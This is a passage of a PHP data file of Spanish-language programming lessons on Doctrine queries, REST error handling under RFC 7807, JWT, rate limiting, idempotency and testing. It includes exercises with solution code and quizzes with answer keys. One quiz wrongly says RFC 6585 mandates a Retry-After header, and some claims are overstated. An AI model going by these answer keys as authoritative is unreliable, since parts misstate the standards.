                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass OptimizedDqlQueryBuilder\n{\n    /**\n     * @param array<string, string> \$joins Array asociativo [relacion => alias]\n     */\n    public function buildJoinFetchDql(string \$rootEntity, string \$rootAlias, array \$joins): string\n    {\n        if (empty(\$joins)) {\n            throw new InvalidArgumentException('Se requiere al menos una relación para construir el JOIN FETCH y mitigar N+1.');\n        }\n\n        \$selectAliases = array_merge([\$rootAlias], array_values(\$joins));\n        \$selectClause = implode(', ', \$selectAliases);\n\n        \$joinClauses = [];\n        foreach (\$joins as \$relation => \$alias) {\n            \$joinClauses[] = sprintf('INNER JOIN %s.%s %s', \$rootAlias, \$relation, \$alias);\n        }\n\n        return sprintf('SELECT %s FROM %s %s %s', \$selectClause, \$rootEntity, \$rootAlias, implode(' ', \$joinClauses));\n    }\n}\n",
                    'explanation' => 'Al construir sentencias DQL que declaran explícitamente los colaboradores en el SELECT y en los JOINs, Doctrine genera una única consulta SQL combinada, hidratando las entidades en memoria y anulando la necesidad de inicializar proxies perezosos.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Consultas N+1, Proxies y Estrategias Anti-N+1 en Doctrine',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué configurar una relación con `fetch: "EAGER"` en el mapeo de la entidad es considerado una pésima práctica en arquitectura Senior?',
                            'options' => [
                                'a' => 'Porque Doctrine no soporta EAGER en PHP 8.',
                                'b' => 'Porque acopla la estrategia de carga a la entidad: obliga a Doctrine a cargar siempre esa relación en cualquier parte del sistema, incluso en comandos CLI o APIs donde jamás se utiliza, generando sobrecosto masivo de memoria y consultas sobredimensionadas.',
                                'c' => 'Porque bloquea la tabla en modo exclusivo.',
                                'd' => 'Porque desactiva las claves foráneas en MySQL.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'fetch: EAGER traslada una decisión de caso de uso a la estructura permanente de la entidad. Las relaciones deben ser LAZY por defecto y cargarse con JOIN FETCH únicamente en los casos de uso que realmente las necesiten.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Qué problema específico resuelve `Doctrine\\ORM\\Tools\\Pagination\\Paginator` al paginar consultas con `JOIN` a colecciones OneToMany?',
                            'options' => [
                                'a' => 'Evita que el comando SQL `LIMIT` corte filas de registros secundarios (hijos) en lugar de entidades principales (padres), calculando el conteo y la lista de IDs mediante subconsultas precisas.',
                                'b' => 'Ordena los resultados alfabéticamente de forma obligatoria.',
                                'c' => 'Comprime las imágenes asociadas a las entidades.',
                                'd' => 'Traduce la consulta a PostgreSQL automáticamente.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Al hacer JOIN con tablas OneToMany, el número de filas SQL devueltas es mayor que el número de entidades principales. Un LIMIT estándar cortaría filas a la mitad de una colección. Paginator garantiza paginación exacta a nivel de entidad principal.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Cuál es la principal ventaja de utilizar proyecciones DTO directas (`SELECT NEW App\\DTO\\MyDto(...)`) frente a hidratar entidades completas en listados de solo lectura?',
                            'options' => [
                                'a' => 'Omite completamente la hidratación de entidades gestionadas en el UnitOfWork y el Identity Map, reduciendo el consumo de memoria RAM hasta un 80% y acelerando el tiempo de procesamiento.',
                                'b' => 'Permite editar las filas directamente en la base de datos sin SQL.',
                                'c' => 'Genera interfaces gráficas en HTML automáticamente.',
                                'd' => 'Elimina la necesidad de definir tablas en MySQL.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Las proyecciones DTO instancian objetos planos inmutables sin registrarlos en el UnitOfWork. Al no haber tracking de cambios ni proxificación, el rendimiento de lectura se aproxima al de SQL puro.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 7: APIS RESTFUL DE NIVEL ENTERPRISE
            // ==========================================

            // ==========================================
            // NIVEL 7: LECCIÓN 1: Diseño de APIs REST Nivel Enterprise
            // ==========================================
            'apis-rest-architecture' => [
                'slug' => 'apis-rest-architecture',
                'title' => 'Diseño de APIs REST Nivel Enterprise',
                'module' => 'APIs RESTful',
                'minutes' => 50,
                'difficulty' => 'Avanzado',
                'overview' => [
                    'concept' => 'Una API REST de nivel Enterprise no consiste en retornar arrays convertidos a JSON con json_encode(). Se rige rigurosamente por los estándares RFC 9110 y RFC 7231 del protocolo HTTP: métodos idempotentes (GET, PUT, DELETE, HEAD, OPTIONS) vs no idempotentes (POST, PATCH), códigos de estado semánticos exactos (200 OK, 201 Created con cabecera Location, 204 No Content para eliminaciones, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 409 Conflict y 422 Unprocessable Entity), y el estándar universal RFC 7807 (Problem Details for HTTP APIs) para estructurar errores previsibles bajo el tipo de contenido application/problem+json.',
                    'problem' => 'El infame antipatrón de responder HTTP 200 OK con { success: false, error: \"Usuario no encontrado\" } en el cuerpo. Esto rompe la interoperabilidad con balanceadores de carga, proxies inversos (ej. Varnish/Nginx) y CDNs (que cachean la respuesta como válida porque el status fue 200), además de forzar a los consumidores de la API a escribir validaciones artesanales e inconsistentes para cada endpoint.',
                    'solution' => 'Estandarizar las respuestas de error mediante la especificación RFC 7807 (type, title, status, detail, instance e invalid_params) implementada en un ExceptionSubscriber central del HttpKernel. Emitir cabeceras estrictas (Content-Type: application/problem+json), cabeceras Location en creaciones POST, y establecer estrategias de versionado profesionales (Content Negotiation vía cabecera Accept o prefijos de ruta).',
                    'problem_label' => 'El Antipatrón de Errores con HTTP 200 y Cuerpos JSON Anárquicos:',
                    'solution_label' => 'La Solución: Semántica HTTP Rigurosa y Estándar RFC 7807 Problem Details:',
                ],
                'internals' => [
                    'title' => 'Estructura del RFC 7807 y la Máquina de Estados de Códigos HTTP',
                    'steps' => [
                        [
                            'phase' => '1. Anatomía del RFC 7807 (Problem Details)',
                            'description' => 'type: URI que categoriza el problema (ej. https://api.com/errors/out-of-stock). title: descripción breve y legible por humanos. status: código HTTP exacto (ej. 422). detail: explicación detallada de la ocurrencia concreta. instance: URI del recurso donde ocurrió. invalid_params: lista opcional de validaciones fallidas.',
                        ],
                        [
                            'phase' => '2. Content-Type: application/problem+json',
                            'description' => 'Las respuestas de error deben usar application/problem+json para que clientes HTTP modernos y gateways identifiquen de forma determinista el formato del payload de error.',
                        ],
                        [
                            'phase' => '3. Matriz de Códigos de Error: 401 vs 403 vs 422',
                            'description' => '401 Unauthorized: falta autenticación o el token es inválido. 403 Forbidden: usuario autenticado pero sin permisos sobre el recurso. 422 Unprocessable Entity: sintaxis JSON válida pero violación de reglas de validación de negocio.',
                        ],
                        [
                            'phase' => '4. Cabecera Location en 201 Created',
                            'description' => 'Al crear un recurso con POST, la respuesta debe retornar HTTP 201 Created y obligatoriamente la cabecera Location: /api/v1/orders/uuid indicando la ubicación del recurso recién creado.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Api/EventListener/ApiExceptionSubscriber.php',
                    'title' => 'Subscriber de Symfony para Formateo Universal RFC 7807 Problem Details',
                    'tag' => 'RFC 7807 Problem Details',
                    'code' => "declare(strict_types=1);

namespace App\Api\EventListener;

use Symfony\Component\EventDispatcher\EventSubscriberInterface;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Event\ExceptionEvent;
use Symfony\Component\HttpKernel\Exception\HttpExceptionInterface;
use Symfony\Component\HttpKernel\KernelEvents;

class ApiExceptionSubscriber implements EventSubscriberInterface
{
    public static function getSubscribedEvents(): array
    {
        return [
            KernelEvents::EXCEPTION => ['onKernelException', 10],
        ];
    }

    public function onKernelException(ExceptionEvent \$event): void
    {
        \$request = \$event->getRequest();
        if (!str_starts_with(\$request->getPathInfo(), '/api/')) {
            return;
        }

        \$throwable = \$event->getThrowable();
        \$statusCode = \$throwable instanceof HttpExceptionInterface
            ? \$throwable->getStatusCode()
            : Response::HTTP_INTERNAL_SERVER_ERROR;

        \$problem = [
            'type' => sprintf('https://api.senior-platform.local/errors/http-%d', \$statusCode),
            'title' => Response::\$statusTexts[\$statusCode] ?? 'Unknown Error',
            'status' => \$statusCode,
            'detail' => \$throwable->getMessage(),
            'instance' => \$request->getPathInfo(),
        ];

        \$response = new JsonResponse(\$problem, \$statusCode, [
            'Content-Type' => 'application/problem+json',
        ]);

        \$event->setResponse(\$response);
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior diseña APIs como contratos inmutables a largo plazo. Piensa en los SDKs cliente, proxies y desarrolladores que integrarán el servicio. Nunca expone trazas internas de base de datos ni excepciones PHP en los mensajes de error de producción. Transforma cualquier excepción no controlada en un RFC 7807 seguro y asigna un correlationId o requestId para depuración en observabilidad sin filtrar detalles internos del servidor.',
                    'critical_questions' => [
                        '¿Este endpoint devuelve códigos de estado semánticos (201, 204, 404, 422) o está cometiendo el antipatrón de devolver 200 OK con mensajes de error?',
                        '¿Estamos incluyendo la cabecera Location en las respuestas 201 Created para que los clientes conozcan la URI del recurso?',
                        '¿Los errores cumplen con el estándar RFC 7807 con Content-Type application/problem+json?',
                        '¿Cómo manejamos la idempotencia en endpoints POST para evitar cobros o creaciones duplicadas por reintentos de red?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Retornar errores cuando un cliente envía un correo duplicado o datos inválidos al registrar un usuario.',
                    'junior' => [
                        'approach' => 'Retorna HTTP 200 con `{"status": "error", "message": "Email ya existe"}` o HTTP 500 con el mensaje de excepción nativo de PDO `SQLSTATE[23000]: Integrity constraint violation`.',
                        'flaws' => [
                            'HTTP 200 en errores confunde a herramientas de observabilidad, proxies y gateways.',
                            'Exposición de internals de base de datos (SQLSTATE): brecha de seguridad grave.',
                            'Formato de error propietario e impredecible.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Retorna HTTP 422 Unprocessable Entity (o 409 Conflict si colisiona con estado persistido) con cabecera `Content-Type: application/problem+json` y el payload RFC 7807 con lista de `invalid_params`.',
                        'rationale' => [
                            '100% interoperable con cualquier cliente HTTP estándar.',
                            'Mensaje limpio sin filtraciones de infraestructura interna.',
                            'Los gateways y proxies manejan métricas de error 4xx/5xx con precisión.',
                        ],
                        'trade_offs' => 'Requiere centralizar el manejo de excepciones en un Subscriber del framework.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Generador Canónico de RFC 7807 Problem Details',
                    'objective' => 'Implementar una clase ProblemDetailsFactory que construya estructuras conformes al estándar RFC 7807 con validación de códigos de estado cliente/servidor.',
                    'instructions' => 'Implementa ProblemDetailsFactory con el método createProblem(int $statusCode, string $title, string $detail, ?string $type = null, array $invalidParams = []): array. Si $statusCode < 400 o > 599, lanza una InvalidArgumentException. Construye el array con "type" (default: "about:blank"), "title", "status" y "detail". Si $invalidParams no está vacío, añade la clave "invalid_params". Retorna el array del payload.',
                    'filename' => 'ProblemDetailsFactory.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass ProblemDetailsFactory\n{\n    /**\n     * @param array<string, string> \$invalidParams\n     */\n    public function createProblem(int \$statusCode, string \$title, string \$detail, ?string \$type = null, array \$invalidParams = []): array\n    {\n        // TODO: Validar que \$statusCode esté entre 400 y 599 o lanzar InvalidArgumentException\n        // TODO: Construir estructura RFC 7807 (type, title, status, detail)\n        // TODO: Si \$invalidParams no está vacío, anexar 'invalid_params'\n        // Retornar array resultante\n        return [];\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass ProblemDetailsFactory\n{\n    /**\n     * @param array<string, string> \$invalidParams\n     */\n    public function createProblem(int \$statusCode, string \$title, string \$detail, ?string \$type = null, array \$invalidParams = []): array\n    {\n        if (\$statusCode < 400 || \$statusCode > 599) {\n            throw new InvalidArgumentException(sprintf('El código de estado HTTP debe ser un error cliente (4xx) o servidor (5xx). Recibido: %d', \$statusCode));\n        }\n\n        \$problem = [\n            'type' => \$type ?? 'about:blank',\n            'title' => \$title,\n            'status' => \$statusCode,\n            'detail' => \$detail,\n        ];\n\n        if (!empty(\$invalidParams)) {\n            \$problem['invalid_params'] = \$invalidParams;\n        }\n\n        return \$problem;\n    }\n}\n",
                    'explanation' => 'El estándar RFC 7807 unifica el tratamiento de errores HTTP. Al construir payloads con type, title, status y detail, los clientes pueden reaccionar programáticamente a códigos semánticos sin depender de formatos arbitrarios.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Semántica HTTP y Estándar RFC 7807',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la cabecera `Content-Type` estándar definida por el RFC 7807 para respuestas con Problem Details?',
                            'options' => [
                                'a' => 'application/problem+json',
                                'b' => 'text/error+xml',
                                'c' => 'application/x-www-form-urlencoded',
                                'd' => 'application/json-rpc',
                            ],
                            'correct' => 'a',
                            'explanation' => 'El RFC 7807 define application/problem+json como el media type estándar para que los clientes reconozcan de forma unívoca payloads estructurados de error.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es la diferencia técnica fundamental entre el código de estado HTTP 401 Unauthorized y el HTTP 403 Forbidden?',
                            'options' => [
                                'a' => '401 indica que no se enviaron credenciales válidas (falta autenticación); 403 indica que el cliente está autenticado pero no tiene permisos para acceder al recurso solicitado.',
                                'b' => '401 solo se usa en servidores Apache y 403 en Nginx.',
                                'c' => '401 es un error de base de datos y 403 es un error de red.',
                                'd' => 'Son idénticos y pueden usarse indistintamente.',
                            ],
                            'correct' => 'a',
                            'explanation' => '401 es un fallo de autenticación (quién eres); 403 es un fallo de autorización (qué puedes hacer). Reintentar una petición 401 con credenciales válidas puede tener éxito; un 403 no se resolverá reintentando las mismas credenciales.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué método HTTP es estrictamente NO idempotente según el estándar RFC 9110?',
                            'options' => [
                                'a' => 'POST',
                                'b' => 'GET',
                                'c' => 'PUT',
                                'd' => 'DELETE',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Un método es idempotente si ejecutar N peticiones idénticas produce el mismo efecto que ejecutar 1 sola. GET, PUT y DELETE son idempotentes. POST es no idempotente porque cada ejecución puede crear un nuevo recurso adicional.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 7: LECCIÓN 2: Rate Limiting, JWT & Idempotencia
            // ==========================================
            'apis-rate-limiting-auth' => [
                'slug' => 'apis-rate-limiting-auth',
                'title' => 'Rate Limiting, JWT & Idempotencia',
                'module' => 'APIs RESTful',
                'minutes' => 55,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'La resiliencia, seguridad y consistencia en APIs de alta disponibilidad descansan sobre tres pilares de ingeniería: Autenticación Asimétrica con JSON Web Tokens (algoritmo RS256 con par de claves pública/privada de 2048/4096 bits para desacoplar el servicio de autenticación de las APIs de lectura), Rate Limiting Distribuido (algoritmos Token Bucket o Sliding Window Counter en Redis mediante scripts Lua atómicos para neutralizar abusos y ataques DDoS), y el protocolo de Claves de Idempotencia (cabecera Idempotency-Key) que garantiza que reintentos de peticiones POST (por caídas transitorias de red) no provoquen cobros dobles ni duplicación de registros.',
                    'problem' => 'Cobros duplicados a clientes en pasarelas de pago cuando una petición POST experimenta un timeout de red y la aplicación móvil la reintenta automáticamente. JWTs con algoritmos simétricos inseguros (HS256 con secret strings expuestos) y APIs sin rate limiting donde un script malicioso satura el pool de conexiones MySQL en cuestión de segundos.',
                    'solution' => 'Construir un Idempotency Middleware con Redis: interceptar la cabecera Idempotency-Key (UUID v4), adquirir un lock distribuido atómico (SET key \"PROCESSING\" NX EX 30), cachear la respuesta con su código de estado durante 24 horas y devolver la respuesta cacheada sin re-ejecutar el negocio en reintentos posteriores. Combinar con JWTs RS256 de corta vida (15 minutos) y Rate Limiting defensivo con cabeceras estándar (RateLimit-Limit, RateLimit-Remaining, Retry-After).',
                    'problem_label' => 'El Riesgo de Peticiones Duplicadas y Seguridad Vulnerable en APIs:',
                    'solution_label' => 'La Solución: Claves de Idempotencia en Redis, JWT Asimétrico RS256 y Rate Limiting:',
                ],
                'internals' => [
                    'title' => 'Mecánica de Claves de Idempotencia y Algoritmo Sliding Window',
                    'steps' => [
                        [
                            'phase' => '1. Protocolo Idempotency-Key en Redis',
                            'description' => 'El cliente envía Idempotency-Key: uuid. El servidor hace SETNX. Si está en curso retorna HTTP 409 Conflict. Si el lock se adquiere, procesa la orden y guarda la respuesta en Redis (SET idempotency:{key} JSON EX 86400). Peticiones idénticas posteriores devuelven el resultado cacheado en 1ms sin tocar la base de datos.',
                        ],
                        [
                            'phase' => '2. Autenticación Asimétrica JWT (RS256)',
                            'description' => 'El Authentication Server firma el JWT con una Clave Privada RSA. Las APIs y microservicios verifican la firma criptográfica usando únicamente la Clave Pública. Si una API de lectura es vulnerada, los atacantes nunca obtienen la capacidad de firmar tokens nuevos.',
                        ],
                        [
                            'phase' => '3. Rate Limiting con Sliding Window en Redis',
                            'description' => 'A diferencia de Fixed Window (que permite ráfagas dobles en el cambio de ventana), el Sliding Window Counter almacena marcas de tiempo en un Sorted Set de Redis. Con ZREMRANGEBYSCORE y ZCARD calcula con exactitud matemática cuántas peticiones se hicieron en los últimos 60 segundos.',
                        ],
                        [
                            'phase' => '4. Cabeceras RFC de Rate Limiting y HTTP 429',
                            'description' => 'Al superar el límite configurado, el servidor emite HTTP 429 Too Many Requests junto con las cabeceras RateLimit-Limit, RateLimit-Remaining: 0 y Retry-After indicando los segundos que el cliente debe esperar antes de reintentar.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Api/Idempotency/IdempotencyMiddleware.php',
                    'title' => 'Middleware de Idempotencia Distribuida con Redis en Symfony',
                    'tag' => 'Distributed Idempotency Engine',
                    'code' => "declare(strict_types=1);

namespace App\Api\Idempotency;

use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;

class IdempotencyMiddleware
{
    private const LOCK_TTL_SECONDS = 30;
    private const CACHE_TTL_SECONDS = 86400; // 24 horas

    /**
     * @param object \$redisClient Cliente Redis con soporte de comandos atómicos
     */
    public function __construct(
        private readonly object \$redisClient
    ) {}

    public function handle(Request \$request, callable \$next): Response
    {
        // La idempotencia solo aplica a métodos no idempotentes con cabecera presente
        if (!in_array(\$request->getMethod(), ['POST', 'PATCH'], true)) {
            return \$next(\$request);
        }

        \$idempotencyKey = \$request->headers->get('Idempotency-Key');
        if (!\$idempotencyKey) {
            return \$next(\$request);
        }

        \$cacheKey = sprintf('idempotency:%s', \$idempotencyKey);
        \$lockKey = sprintf('lock:%s', \$cacheKey);

        // 1. Si la respuesta ya fue procesada previamente, se retorna de inmediato
        \$cached = \$this->redisClient->get(\$cacheKey);
        if (\$cached !== null && \$cached !== false) {
            \$data = json_decode((string) \$cached, true);
            return new JsonResponse(\$data['body'], \$data['status'], \$data['headers'], true);
        }

        // 2. Adquisición atómica de lock para evitar ejecuciones concurrentes simultáneas
        \$acquired = \$this->redisClient->set(\$lockKey, 'PROCESSING', ['NX', 'EX' => self::LOCK_TTL_SECONDS]);
        if (!\$acquired) {
            return new JsonResponse([
                'error' => 'Conflict',
                'message' => 'Una petición idéntica se está procesando actualmente. Intenta en unos segundos.',
            ], Response::HTTP_CONFLICT);
        }

        try {
            /** @var Response \$response */
            \$response = \$next(\$request);

            // 3. Cachear la respuesta exitosa para futuros reintentos
            if (\$response->getStatusCode() < 500) {
                \$payload = json_encode([
                    'status' => \$response->getStatusCode(),
                    'headers' => ['X-Idempotency-Cached' => 'true'],
                    'body' => \$response->getContent(),
                ]);
                \$this->redisClient->set(\$cacheKey, \$payload, ['EX' => self::CACHE_TTL_SECONDS]);
            }

            return \$response;
        } finally {
            \$this->redisClient->del(\$lockKey);
        }
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior diseña sistemas asumiendo que la red fallará (Fallacies of Distributed Computing). Cuando un cliente presiona \"Pagar\", la petición puede llegar al servidor, procesar el cargo en el banco y fallar en el camino de regreso por pérdida de señal móvil. Si el cliente reintenta, la API debe reconocer la `Idempotency-Key` y entregar el recibo original sin cobrar un centavo adicional. En seguridad, el Senior usa RS256 para que las APIs consumidoras solo verifiquen firmas con la clave pública sin compartir jamás secretos de firma.',
                    'critical_questions' => [
                        '¿Qué ocurre si la conexión del usuario se interrumpe tras ejecutar un débito bancario y el cliente reintenta el POST?',
                        '¿Nuestras claves de idempotencia expiran tras un TTL razonable (24-48 horas) en Redis?',
                        '¿Estamos utilizando JWTs firmados con algoritmos asimétricos (RS256/ES256) para que los servicios de lectura no compartan la clave privada?',
                        '¿El algoritmo de rate limiting devuelve cabeceras informativas (RateLimit-Remaining, Retry-After) para guiar a los clientes?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Proteger un endpoint de transferencias bancarias POST /api/v1/transfers contra cobros duplicados y ataques de fuerza bruta.',
                    'junior' => [
                        'approach' => 'No usa claves de idempotencia. En rate limiting usa un contador en sesión PHP que un script cURL puede evadir fácilmente cambiando de sesión en cada petición.',
                        'flaws' => [
                            'Riesgo crítico de doble cargo ante reintentos automáticos del navegador o app móvil.',
                            'El rate limiting basado en sesión no protege contra ataques distribuidos.',
                            'Pérdidas económicas reales por reclamaciones de cobros duplicados.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Exige `Idempotency-Key` (UUID v4) en cabecera HTTP respaldada por Redis con lock atómico. Implementa Sliding Window Rate Limiting por API Key/IP retornando HTTP 429 con `Retry-After`. Utiliza JWTs RS256 con revocación activa.',
                        'rationale' => [
                            'Consistencia transaccional garantizada ante cualquier fallo de red.',
                            'Protección infranqueable contra ataques DDoS y fuerza bruta.',
                            'Arquitectura alineada con estándares de Stripe, Adyen y AWS.',
                        ],
                        'trade_offs' => 'Requiere infraestructura de Redis de alta disponibilidad y clientes que generen UUIDs.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Validador y Gestor de Respuestas de Idempotencia',
                    'objective' => 'Implementar una clase IdempotencyKeyManager que valide el formato canónico de claves UUID v4 y empaquete respuestas HTTP para su almacenamiento en caché distribuida.',
                    'instructions' => 'Implementa IdempotencyKeyManager con los métodos validateKey(string $key): bool (verificando formato UUID v4 mediante expresión regular) y buildCachedResponse(int $statusCode, array $headers, string $body): array. Si $statusCode < 100 o > 599, lanza una InvalidArgumentException. Retorna el array estructurado con las claves "status", "headers", "body" y "cached_at" (timestamp actual).',
                    'filename' => 'IdempotencyKeyManager.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass IdempotencyKeyManager\n{\n    public function validateKey(string \$key): bool\n    {\n        // TODO: Validar formato UUID v4 y retornar bool\n        return false;\n    }\n\n    /**\n     * @param array<string, string> \$headers\n     * @return array{status: int, headers: array<string, string>, body: string, cached_at: int}\n     */\n    public function buildCachedResponse(int \$statusCode, array \$headers, string \$body):\n    array {\n        // TODO: Validar que \$statusCode esté entre 100 y 599 o lanzar InvalidArgumentException\n        // Retornar array estructurado con status, headers, body y cached_at\n        return [];\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass IdempotencyKeyManager\n{\n    private const UUID_V4_PATTERN = '/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i';\n\n    public function validateKey(string \$key): bool\n    {\n        return preg_match(self::UUID_V4_PATTERN, \$key) === 1;\n    }\n\n    /**\n     * @param array<string, string> \$headers\n     * @return array{status: int, headers: array<string, string>, body: string, cached_at: int}\n     */\n    public function buildCachedResponse(int \$statusCode, array \$headers, string \$body): array\n    {\n        if (\$statusCode < 100 || \$statusCode > 599) {\n            throw new InvalidArgumentException(sprintf('Código de estado HTTP no válido: %d', \$statusCode));\n        }\n\n        return [\n            'status' => \$statusCode,\n            'headers' => \$headers,\n            'body' => \$body,\n            'cached_at' => time(),\n        ];\n    }\n}\n",
                    'explanation' => 'Un gestor de idempotencia asegura que únicamente claves válidas (UUID v4) ingresen al pipeline transaccional. El empaquetamiento estandarizado permite reconstruir fielmente la respuesta HTTP original en 1 milisegundo ante cualquier reintento.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: JWT Asimétrico, Rate Limiting e Idempotencia',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la principal ventaja de seguridad de utilizar JWTs con algoritmo asimétrico (RS256) en lugar de simétrico (HS256) en una arquitectura de microservicios?',
                            'options' => [
                                'a' => 'RS256 permite que solo el Authentication Server posea la Clave Privada para firmar tokens; los microservicios consumidores solo necesitan la Clave Pública para validar firmas, de modo que si un microservicio es comprometido, los atacantes no pueden forjar tokens nuevos.',
                                'b' => 'RS256 no consume memoria RAM en el servidor.',
                                'c' => 'HS256 no es compatible con el estándar JSON.',
                                'd' => 'RS256 genera tokens de solo 10 caracteres.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'En criptografía asimétrica, la firma requiere la clave privada secreta, pero la verificación solo requiere la clave pública. Distribuir únicamente claves públicas a los servicios consumidores erradica el riesgo de falsificación de tokens ante filtraciones.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Qué debe hacer un servidor cuando recibe una petición HTTP con una `Idempotency-Key` cuya operación ya fue completada exitosamente hace 1 hora?',
                            'options' => [
                                'a' => 'Ejecutar la operación nuevamente y sumar el importe.',
                                'b' => 'Devolver de inmediato la respuesta HTTP previamente cacheada (código de estado, cabeceras y cuerpo original) sin re-ejecutar la lógica de negocio ni mutar la base de datos.',
                                'c' => 'Lanzar un error HTTP 500 fatal.',
                                'd' => 'Reiniciar el clúster de Redis.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'El principio de idempotencia exige que N peticiones idénticas produzcan el mismo resultado observable que 1 sola. Devolver la respuesta guardada garantiza que el cliente reciba la confirmación sin duplicar el efecto de la operación.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué cabecera HTTP debe incluir obligatoriamente una respuesta con código de estado `HTTP 429 Too Many Requests` para guiar al cliente?',
                            'options' => [
                                'a' => 'Retry-After',
                                'b' => 'Content-Encoding',
                                'c' => 'Transfer-Encoding',
                                'd' => 'Authorization',
                            ],
                            'correct' => 'a',
                            'explanation' => 'El estándar RFC 6585 define que las respuestas HTTP 429 deben incluir Retry-After especificando el número de segundos (o una fecha GMT) que el cliente debe esperar antes de volver a intentar la petición.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // LECCIÓN: Unit vs Integration vs Functional Testing
            // ==========================================
            'testing-unit-vs-integration' => [
                'slug' => 'testing-unit-vs-integration',
                'title' => 'Unit vs Integration vs Functional Testing',
                'module' => 'Testing & TDD',
                'minutes' => 45,
                'difficulty' => 'Intermedio',
                'overview' => [
                    'concept' => 'Una estrategia de testing profesional no se mide por el volumen indiscriminado de pruebas, sino por la distribución equilibrada entre velocidad de feedback y nivel de confianza. El diamante de pruebas moderno en Symfony distingue tres niveles: Pruebas Unitarias puras (rápidas, prueban lógica de dominio y Value Objects sin arrancar el framework ni usar I/O), Pruebas de Integración con KernelTestCase (validan repositorios Doctrine, eventos, y transacciones con la base de datos real mediante rollback automático), y Pruebas Funcionales con WebTestCase (simulan peticiones HTTP completas para validar el middleware, seguridad, serialización JSON y códigos de estado semánticos).',
                    'problem' => 'Suites de pruebas lentas e inmanejables que tardan decenas de minutos en CI, combinadas con tests unitarios hiper-frágiles donde se mockea absolutamente todo (incluso EntityManagerInterface y QueryBuilder). Al mínimo refactor de una consulta o extracción de método privado, decenas de tests fallan aunque el comportamiento funcional siga siendo impecable.',
                    'solution' => 'Adoptar el enfoque de "Test Doubles Pragmáticos": no mockear lo que posees ni estructuras de datos inmutables. Emplear pruebas unitarias ultra veloces para la lógica pura, y reservar las pruebas de integración con DAMADoctrineTestBundle para consultas a base de datos. Reservar WebTestCase para verificar el contrato HTTP sin levantar servidores web reales.',
                    'problem_label' => 'El Antipatrón del Mocking Masivo y Suites de 25 Minutos en CI:',
                    'solution_label' => 'La Solución: El Diamante de Pruebas con Transacciones y Objetos de Dominio Reales:',
                ],
                'internals' => [
                    'title' => 'Ciclo de Vida de Aislamiento y Dobles de Prueba',
                    'steps' => [
                        [
                            'phase' => '1. PHPUnit Execution & Contenedor de Symfony',
                            'description' => 'KernelTestCase reutiliza la instancia del contenedor de dependencias compilado entre tests para mitigar la sobrecarga de arranque, pero aísla el estado limpiando propiedades estáticas y servicios no compartidos.',
                        ],
                        [
                            'phase' => '2. DAMADoctrineTestBundle & Transacciones Rollback',
                            'description' => 'En lugar de recrear esquemas o truncar tablas por prueba, DAMA inicia una transacción en el EntityManager antes de cada test y ejecuta un ROLLBACK al terminar. Pruebas de integración sobre MySQL/PostgreSQL corren en milisegundos sin dejar residuos.',
                        ],
                        [
                            'phase' => '3. Taxonomía de Test Doubles (Meszaros / Fowler)',
                            'description' => 'Dummy: se pasa pero no se usa. Stub: provee respuestas indirectas prefijadas. Spy: registra llamadas de forma pasiva. Mock: define expectativas estrictas de comportamiento. Fake: implementación funcional ligera en memoria (ej. InMemoryUserRepository).',
                        ],
                        [
                            'phase' => '4. WebTestCase & KernelBrowser en Memoria',
                            'description' => 'KernelBrowser despacha peticiones llamando a Kernel::handle() sin sockets de red reales ni Nginx, lo que permite evaluar serialización JSON, headers de seguridad y transiciones de estado HTTP a velocidad de proceso interno.',
                        ],
                    ],
                ],
                'architecture_code' => [
